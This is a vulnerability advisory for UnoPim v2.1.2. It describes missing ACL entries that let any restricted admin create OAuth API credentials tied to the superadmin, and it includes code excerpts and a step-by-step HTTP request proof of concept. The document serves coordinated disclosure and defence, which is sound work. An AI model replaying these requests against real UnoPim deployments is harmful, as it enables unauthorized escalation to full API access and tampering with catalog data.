https://github.com/unopim/unopim

## Title: Restricted Admin Can Create Full-Access OAuth API Credentials via Missing ACL Enforcement

Affected Versions: confirmed on commit 3e894245 (v2.1.2)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE: CWE-862 -- Missing Authorization

### Summary

Any authenticated admin user, regardless of their assigned role and permissions, can create a new OAuth API integration tied to a superadmin account and generate working client credentials for it. The integration management routes that perform the write actions (store and update) are not registered in the ACL configuration, so the Bouncer middleware never enforces a permission check on them. An attacker with the most restricted role possible can use these unguarded endpoints to mint a password-grant OAuth client linked to the superadmin, then authenticate via the OAuth password grant to obtain a bearer token with full API access.

### Details

UnoPim uses a custom ACL system. On each request the Bouncer middleware at packages/Webkul/User/src/Http/Middleware/Bouncer.php calls checkIfAuthorized(), which looks up the current route name in the ACL roles map. If the route is present in the map, bouncer()->allow() is called and the user's permissions are verified. If the route is absent from the map, no check is performed and the action proceeds unchecked.

The integration routes are defined in packages/Webkul/AdminApi/src/Routes/integrations-routes.php:

    Route::post('create', 'store')->name('admin.configuration.integrations.store');
    Route::put('edit/{id}', 'update')->name('admin.configuration.integrations.update');
    Route::post('generate', 'generateKey')->name('admin.configuration.integrations.generate_key');
    Route::post('re-generate-secrete', 'regenerateSecretKey')->name('admin.configuration.integrations.re_generate_secret_key');

In packages/Webkul/Admin/src/Config/acl.php, the integration section contains entries only for the view and delete routes. The store, update, generate_key, and re_generate_secret_key route names are absent:

    ['key' => 'configuration.integrations.create', 'route' => 'admin.configuration.integrations.create', ...],
    ['key' => 'configuration.integrations.edit',   'route' => 'admin.configuration.integrations.edit',   ...],
    ['key' => 'configuration.integrations.delete', 'route' => 'admin.configuration.integrations.delete', ...],

The checkIfAuthorized() function in Bouncer.php at lines 88-98 only calls bouncer()->allow() when the route is in the map. For the unregistered routes the function returns without performing any check:

    public function checkIfAuthorized()
    {
        $acl = app('acl');
        if (! $acl) {
            return;
        }
        if (isset($acl->roles[Route::currentRouteName()])) {
            bouncer()->allow($acl->roles[Route::currentRouteName()]);
        }
    }

The ApiKeysController at packages/Webkul/AdminApi/src/Http/Controllers/Integrations/ApiKeysController.php contains no secondary permission checks in store(), update(), generateKey(), or regenerateSecretKey().

### PoC

The following steps were reproduced on a default Docker installation of commit 3e894245 (v2.1.2). A second admin account with a custom role limited to catalog.products view permissions was used as the attacker.

1. Log in as the restricted admin and retrieve the XSRF-TOKEN from the session cookie.

2. Create a new API key record tied to the superadmin (id 1) with full permissions:

    POST /admin/integrations/api-keys/create HTTP/1.1
    Host: localhost:9850
    Cookie: XSRF-TOKEN=<token>; unopim_session=<session>
    Content-Type: application/x-www-form-urlencoded
    X-XSRF-TOKEN: <decoded_xsrf>

    name=AttackerKey&admin_id=1&permission_type=all

    Response: HTTP 302 to /admin/integrations/api-keys/edit/1

3. Generate an OAuth client ID and secret for the newly created key:

    POST /admin/integrations/api-keys/generate HTTP/1.1
    Host: localhost:9850
    Cookie: XSRF-TOKEN=<token>; unopim_session=<session>
    Content-Type: application/x-www-form-urlencoded
    X-XSRF-TOKEN: <decoded_xsrf>

    name=AttackerKey&admin_id=1&apiId=1

    Response: HTTP 200
    {"client_id":"<uuid>","secret_key":"<secret>","oauth_client_id":"<uuid>"}

4. Use the credentials to obtain a bearer token via the OAuth password grant:

    POST /oauth/token HTTP/1.1
    Host: localhost:9850
    Content-Type: application/json

    {"grant_type":"password","client_id":"<uuid>","client_secret":"<secret>","username":"admin@example.com","password":"admin123"}

    Response: HTTP 200
    {"token_type":"Bearer","expires_in":3600,"access_token":"<jwt>"}

5. Use the bearer token to call any REST API endpoint with full permissions:

    GET /api/v1/rest/locales HTTP/1.1
    Host: localhost:9850
    Authorization: Bearer <jwt>
    Accept: application/json

    Response: HTTP 200 with full locale data

The restricted user with only catalog.products view access has obtained a working API token with the same access level as the superadmin.

### Impact

Any authenticated admin user with any non-zero permission set can escalate to full API access by creating an OAuth integration linked to the superadmin account. This allows reading and writing all catalog data (products, categories, attributes, families, channels, locales) via the REST API with the authority of the administrative user whose credentials are paired with the generated client. The attack requires knowledge of or ability to guess the superadmin's email address and password to complete the OAuth password grant step, but the API key creation and client credential generation steps succeed with only session authentication at any permission level. In deployments where the attacker also controls or knows the target admin's credentials, the compromise is complete and persistent until the key is revoked.


## Disclosure
 - 4 June 2026 - reported via email
 - 4 June 2026 - report acknowledged
 - 6 July 2026 - followed up
 - 6 July 2026 - fixed in v2.1.3+
 - 3 September 2026 - disclosed
   
<img width="1205" height="410" alt="image" src="https://github.com/user-attachments/assets/cd20fc8f-4398-40db-93fe-82bfe542076e" />
